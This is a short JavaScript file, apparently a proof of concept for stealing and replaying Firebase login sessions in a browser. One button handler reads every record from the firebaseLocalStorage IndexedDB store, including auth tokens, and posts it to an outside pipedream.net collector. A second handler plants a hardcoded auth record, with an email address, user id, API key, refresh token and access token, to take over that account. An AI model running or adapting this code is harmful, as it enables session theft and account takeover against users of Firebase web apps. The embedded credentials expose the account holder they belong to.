const authButton = document.getElementById("auth-button");

authButton.addEventListener("click", () => {
    const request = window.indexedDB.open("firebaseLocalStorageDb");
    request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const getDataRequest = objectStore.getAll();

        getDataRequest.onsuccess = (event) => {

            const headers = new Headers();
            headers.append("Content-Type", "text/plain");

            const options = {
                method: "POST",
                headers,
                mode: "cors",
                body: JSON.stringify(event.target.result),
            };

            fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);
        }
    };
});

const hijackButton = document.getElementById("hijack-button");

hijackButton.addEventListener("click", () => {
    const request = window.indexedDB.open("firebaseLocalStorageDb");
    request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const data = {
            fbase_key: "firebase:authUser:AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg:[DEFAULT]",
            value: {
                uid: "RTejhfCWw0OAlHcoAj41Fy93ZJJ3",
                email: "mate@gmail.com",
                emailVerified: false,
                isAnonymous: false,
                providerData: [{
                    providerId: "password",
                    uid: "mate@gmail.com",
                    displayName: null,
                    email: "mate@gmail.com",
                    phoneNumber: null,
                    photoURL: null
                }],
                stsTokenManager: {
                    refreshToken: "AMf-vBzopwsIZhE5sW-20uuQr2J9P-RDA-JH8SsNmRdWcy-pqZ5-GX9Hpr6cjKlPc0yXkk-Sotcg-O_4KqkhDRseXm1Fy9AfPyFlvJK31uYV90E1eYctOJgs2OzhORhu8S_P7WHJ_FaeB04bTAoFszgkEpIm2HmITJO-Cr26QCZjNrPojrVAudWOFjDxzSl5SfINs9Uc7-RroOcVEN9T6IyRjHjhxKEg4w",
                    accessToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6ImYyOThjZDA3NTlkOGNmN2JjZTZhZWNhODExNmU4ZjYzMDlhNDQwMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGlwbG9tb3ZrYS10ZXN0LWFwcCIsImF1ZCI6ImRpcGxvbW92a2EtdGVzdC1hcHAiLCJhdXRoX3RpbWUiOjE3MTI1OTgyMDYsInVzZXJfaWQiOiJSVGVqaGZDV3cwT0FsSGNvQWo0MUZ5OTNaSkozIiwic3ViIjoiUlRlamhmQ1d3ME9BbEhjb0FqNDFGeTkzWkpKMyIsImlhdCI6MTcxMjY4NDcxNywiZXhwIjoxNzEyNjg4MzE3LCJlbWFpbCI6Im1hdGVAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1hdGVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.o7nKv5z1seHy1CKnNgcya-7YVe7ciafrDZAjT_vEiut3PVzXwLkkNRwviFJDlLkl4UxCBGqAGk6TCdJusEaFwBRmkJxS561VSfBmEee7Les3Is0PWf6NyCgnJHoQ1Gs1KqqSoI2h-MI7a1Cv7IY6mLniVDJdPoEKnazi3yGNJn16vkTjjXbwZ-UWciFbNkuDMAg-MelaxWVcomnIdtGVJ2vOuTyN-O5xKSvS2XnvxsoK0dasy676aMzig-U4lLaA6cx_ZXWexnNQEHv36f32mIxwtGmlo9xfHpK12DRbVpXf4iBnn3iaU7LEMCuUEy_t09K0oeuB6IaTCuGbOwLfTw",
                    expirationTime: 1712688317122
                },
                createdAt: "1711388904315",
                lastLoginAt: "1712598206878",
                apiKey: "AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg",
                appName: "[DEFAULT]"
            }
        }

        const addDataRequest = objectStore.add(data);

        addDataRequest.onsuccess = (event) => alert("Success!");
    };
});



